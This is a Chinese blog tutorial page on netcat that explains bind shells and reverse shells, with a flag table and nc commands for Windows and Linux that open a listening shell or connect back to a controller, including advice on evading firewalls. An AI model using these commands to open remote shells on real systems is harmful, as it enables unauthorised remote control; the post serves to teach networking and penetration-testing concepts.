<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>netcat瑞士军刀（正向shell和反向shell） - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="netcat瑞士军刀（正向shell和反向shell）" />
<meta property="og:description" content="正向shell：控制端主动发起连接请求去连接被控制端。通常中间网络链路不存在阻碍的时候使用。
反向shell：被控制端主动发起连接去请求连接控制。通常被控端由于防火墙受限制、权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包的时候使用。
参数作用-c指定连接后要执行的shell命令-e指定连接后要执行的文件名-k配置 Socket一直存活(若不想退出 Shell后使监听断开可使用此参数)-l监听模式-p设置本地主机使用的通信端口-u使用UDP传输协议,默认为TCP-v显示指令执行过程,用-vv会更详细 在实战中，大多数采用反向shell，因为正向shell有很多因素导致连接失败，比如说硬件设备有防火墙，入侵防御系统等，还有网站防火墙，端口占用，权限不足等场景，特别是硬件设备如果你正向连接被防火墙拦截导致打草惊蛇，后期攻击相当繁琐。反向shell：而被控制端主动向外发送的数据包通常都不会被拦截。
nc反弹shell （简单举两个列子）
我今天用网络连通性来说下正向和反向
正向shell（网络链路没有阻碍，网络互通）
被控端
原理:被控端将cmd重定向到本地1111端口，控制端主动连接到被控制端的1111端口，即获得shell
#windows机器
nc64.exe -lvvp 1111 -e C:\Windows\System32\cmd.exe
#linux机器
nc -lvvp 1111 -e /bin/bash
控制端
nc 被控端的地址 端口
反向shell（有安全设备防护，控制端无法主动连接被控制端。或者控制端ping不通被控制端）
原理:被控端将cmd.exe重定向到控制端的6666端口，控制端只需要监听本地的6666端口，被控端主动连接控制端，即可获得shell。
被控端
nc 控制端IP 端口 -e cmd
控制端
nc -lvvp 端口
控制端ping不通被控端
被控端能ping通控制端 不管是正向shell还是反向shell 它们都是由被控制端将命令行输入和输入通过tcp/udp端口，发送到控制端，只是正向shell是由控制端主动发起连接的，而反弹shell是被控制端主动发起连接的。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/90a81d3dfa96abaebc4211e763a0c89d/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-12-04T10:54:49+08:00" />
<meta property="article:modified_time" content="2023-12-04T10:54:49+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">netcat瑞士军刀（正向shell和反向shell）</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p>正向shell：控制端主动发起连接请求去连接被控制端。通常中间网络链路不存在阻碍的时候使用。</p> 
<p>反向shell：被控制端主动发起连接去请求连接控制。通常被控端由于防火墙受限制、权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包的时候使用。</p> 
<table style="width:680px;"><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-c</td><td>指定连接后要执行的shell命令</td></tr><tr><td>-e</td><td>指定连接后要执行的文件名</td></tr><tr><td>-k</td><td>配置 Socket一直存活(若不想退出 Shell后使监听断开可使用此参数)</td></tr><tr><td>-l</td><td>监听模式</td></tr><tr><td>-p</td><td>设置本地主机使用的通信端口</td></tr><tr><td>-u</td><td>使用UDP传输协议,默认为TCP</td></tr><tr><td>-v</td><td>显示指令执行过程,用-vv会更详细</td></tr></tbody></table> 
<p>             在实战中，大多数采用反向shell，因为正向shell有很多因素导致连接失败，比如说硬件设备有防火墙，入侵防御系统等，还有网站防火墙，端口占用，权限不足等场景，特别是硬件设备如果你正向连接被防火墙拦截导致打草惊蛇，后期攻击相当繁琐。反向shell：而被控制端主动向外发送的数据包通常都不会被拦截。</p> 
<p> nc反弹shell （简单举两个列子）</p> 
<p>我今天用网络连通性来说下正向和反向</p> 
<p>   正向shell（网络链路没有阻碍，网络互通）</p> 
<p>被控端</p> 
<p>原理:被控端将cmd重定向到本地1111端口，控制端主动连接到被控制端的1111端口，即获得shell</p> 
<p>#windows机器<br> nc64.exe -lvvp 1111 -e C:\Windows\System32\cmd.exe<br> #linux机器<br> nc -lvvp 1111 -e /bin/bash</p> 
<p>控制端</p> 
<p>nc 被控端的地址  端口</p> 
<p>反向shell（有安全设备防护，控制端无法主动连接被控制端。或者控制端ping不通被控制端）</p> 
<p>原理:被控端将cmd.exe重定向到控制端的6666端口，控制端只需要监听本地的6666端口，被控端主动连接控制端，即可获得shell。</p> 
<p>被控端</p> 
<p>nc 控制端IP  端口  -e cmd</p> 
<p>控制端</p> 
<p>nc -lvvp 端口</p> 
<p>控制端ping不通被控端</p> 
<p><img alt="" height="79" src="https://images2.imgbox.com/d1/83/83TsTROq_o.png" width="610"></p> 
<p>被控端能ping通控制端 </p> 
<p><img alt="" height="78" src="https://images2.imgbox.com/38/4a/Xa3mGgll_o.png" width="536"></p> 
<p>不管是正向shell还是反向shell 它们都是由被控制端将命令行输入和输入通过tcp/udp端口，发送到控制端，只是正向shell是由控制端主动发起连接的，而反弹shell是被控制端主动发起连接的。</p> 
<p></p> 
<p></p> 
<p></p> 
<p></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/5b9b270440ea334c82148abd03f4daec/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">stm32mp157和imx6ull在设备树节点上设置ap3216c的主要区别</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/e16523248213a645ef9a01b314fa05b3/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Windows10下Mysql8.0安装教程</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>